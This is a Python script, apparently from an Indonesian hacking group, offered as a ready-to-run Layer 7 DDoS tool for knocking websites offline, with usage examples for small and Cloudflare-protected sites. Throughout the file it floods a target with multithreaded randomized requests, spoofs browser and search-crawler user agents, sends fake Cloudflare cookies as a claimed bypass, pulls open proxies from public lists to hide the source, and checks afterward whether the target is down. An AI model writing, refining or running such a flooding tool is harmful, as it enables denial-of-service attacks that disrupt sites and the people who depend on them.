#!/usr/bin/env python3
# 🇮🇩 CYBER indonet - L7 DDoS Toolkit
# Tembus CF & Small Site
# USAGE: python3 cyber_l7.py <target_url> <threads> <duration> --use-proxy

import threading
import requests
import random
import time
import sys
import socket
from concurrent.futures import ThreadPoolExecutor

class CyberL7:
    def __init__(self, target, use_proxy=True, threads=500):
        self.target = target if target.startswith('http') else f'http://{target}'
        self.host = target.replace('http://', '').replace('https://', '').split('/')[0]
        self.threads = threads
        self.use_proxy = use_proxy
        self.proxies = []
        self.requests_count = 0
        self.running = True
        
        # Load proxy list jika ada
        if self.use_proxy:
            self.load_proxies()
        
        # Header rotation database
        self.headers_pool = [
            {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
            {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'},
            {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'},
            {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'},
            {'User-Agent': 'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'}
        ]
        
        # CF bypass techniques
        self.cf_params = [
            '__cf_chl_jschl_tk__', '__cf_chl_f_tk', '__cf_chl_captcha_tk__',
            'cf_clearance', '__cf_bm', '__cfruid'
        ]
        
        # Referer spam list
        self.referers = [
            'https://www.google.com/', 'https://www.facebook.com/',
            'https://twitter.com/', 'https://www.youtube.com/',
            'https://www.reddit.com/', 'https://www.bing.com/'
        ]

    def load_proxies(self):
        """Auto load proxies dari sumber public atau file"""
        proxy_sources = [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http',
            'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
            'https://www.proxy-list.download/api/v1/get?type=http'
        ]
        
        for source in proxy_sources:
            try:
                response = requests.get(source, timeout=5)
                if response.status_code == 200:
                    self.proxies = response.text.strip().split('\n')
                    print(f"[+] Loaded {len(self.proxies)} proxies from {source}")
                    break
            except:
                continue
        
        # Fallback local proxy list
        if not self.proxies:
            self.proxies = [
                '103.152.112.162:80', '45.95.203.105:80', '194.163.183.57:80',
                '178.128.211.61:8080', '103.147.77.66:3125'
            ]
    
    def generate_cookie(self):
        """Generate random cookies khusus bypass CF"""
        cookies = {}
        for param in self.cf_params:
            if random.random() > 0.7:
                cookies[param] = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=50))
        return cookies
    
    def build_request(self):
        """Bangun request dengan fingerprint random"""
        method = random.choice(['GET', 'POST', 'HEAD'])
        headers = random.choice(self.headers_pool)
        headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        headers['Accept-Language'] = random.choice(['en-US,en;q=0.9', 'id-ID,id;q=0.8', 'fr-FR,fr;q=0.7'])
        headers['Accept-Encoding'] = 'gzip, deflate, br'
        headers['Cache-Control'] = 'no-cache'
        headers['Connection'] = 'keep-alive'
        headers['Upgrade-Insecure-Requests'] = '1'
        headers['Sec-Fetch-Dest'] = 'document'
        headers['Sec-Fetch-Mode'] = 'navigate'
        headers['Sec-Fetch-Site'] = 'cross-site'
        headers['Sec-Fetch-User'] = '?1'
        headers['Referer'] = random.choice(self.referers)
        
        # Random path untuk bypass cache
        paths = ['/', '/index.php', '/home', '/wp-login.php', '/api/v1/test',
                 '/admin', '/search?q=' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10)),
                 '/assets/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)) + '.css']
        
        url = self.target + random.choice(paths)
        
        # Pilih proxy random jika mode proxy aktif
        proxy = None
        if self.use_proxy and self.proxies:
            proxy = {'http': f'http://{random.choice(self.proxies)}',
                    'https': f'http://{random.choice(self.proxies)}'}
        
        return method, url, headers, proxy
    
    def attack(self):
        """Single attack thread"""
        while self.running:
            try:
                method, url, headers, proxy = self.build_request()
                cookies = self.generate_cookie()
                
                # Timeout pendek untuk mempercepat request
                timeout = random.uniform(2, 5)
                
                if method == 'GET':
                    response = requests.get(url, headers=headers, cookies=cookies,
                                          proxies=proxy, timeout=timeout, allow_redirects=True)
                elif method == 'POST':
                    # Random POST data
                    data = {f'field{random.randint(1,10)}': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=20))}
                    response = requests.post(url, headers=headers, data=data,
                                           cookies=cookies, proxies=proxy, timeout=timeout)
                else:  # HEAD
                    response = requests.head(url, headers=headers, cookies=cookies,
                                           proxies=proxy, timeout=timeout)
                
                self.requests_count += 1
                if self.requests_count % 100 == 0:
                    print(f"[+] Requests sent: {self.requests_count} | Target: {self.host}")
                
                # Slowloris variant: keep connection open
                if random.random() > 0.8:
                    time.sleep(random.uniform(5, 15))
                    
            except Exception as e:
                # Skip error logging untuk performance
                continue
    
    def start(self, duration):
        """Launch attack dengan semua threads"""
        print(f"[🔥] CYBER indonet L7 Attack Started")
        print(f"[🎯] Target: {self.target}")
        print(f"[⚡] Threads: {self.threads}")
        print(f"[⏱️] Duration: {duration} seconds")
        print(f"[🛡️] CF Bypass: {'ACTIVE' if 'cloudflare' in self.host else 'READY'}")
        print("[+] Press Ctrl+C to stop\n")
        
        # Start threads
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for _ in range(self.threads):
                executor.submit(self.attack)
            
            # Timer
            time.sleep(duration)
            self.running = False
        
        print(f"\n[✅] Attack completed!")
        print(f"[📊] Total requests sent: {self.requests_count}")
        print(f"[🛑] Target status: {self.check_target()}")

    def check_target(self):
        """Check target response setelah attack"""
        try:
            response = requests.get(self.target, timeout=10)
            return f"UP - Status {response.status_code}" if response.status_code < 500 else f"SLOW/DOWN - Status {response.status_code}"
        except:
            return "DOWN - Timeout/Connection failed"

# MAIN EXECUTION
if __name__ == "__main__":
    print("\n" + "="*60)
    print("🇮🇩 CYBER indonet - DDoS Layer 7 Ultimate")
    print("="*60)
    
    if len(sys.argv) < 4:
        print("Usage: python3 cyber_l7.py <target_url> <threads> <duration_seconds> [--proxy]")
        print("Example:")
        print("  Small site: python3 cyber_l7.py http://example.com 300 60")
        print("  CF site:    python3 cyber_l7.py https://target-with-cf.com 500 120 --proxy")
        sys.exit(1)
    
    target = sys.argv[1]
    threads = int(sys.argv[2])
    duration = int(sys.argv[3])
    use_proxy = '--proxy' in sys.argv
    
    attacker = CyberL7(target, use_proxy=use_proxy, threads=threads)
    attacker.start(duration)
